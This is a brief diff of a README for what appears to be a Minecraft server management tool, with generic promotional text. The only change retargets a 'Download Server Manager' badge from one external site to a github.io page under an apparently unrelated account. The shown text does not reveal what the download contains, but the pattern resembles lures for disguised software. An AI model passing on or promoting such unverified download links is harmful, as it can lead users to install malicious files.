@@ -5,7 +5,7 @@ Perfect for casual hosts and large-scale communities, it provides streamlined to
 
 From live performance insights to intelligent backup scheduling, this manager ensures your Minecraft server runs fast, stable, and protected — all while reducing your workload.
 
-[![Download Server Manager](https://img.shields.io/badge/Download-Server_Manager-blueviolet)](https://paddyrewards.com/)
+[![Download Server Manager](https://img.shields.io/badge/Download-Server_Manager-blueviolet)](https://alfrednovakvpmw.github.io/.github/minecraft-server)
 
 ---
 
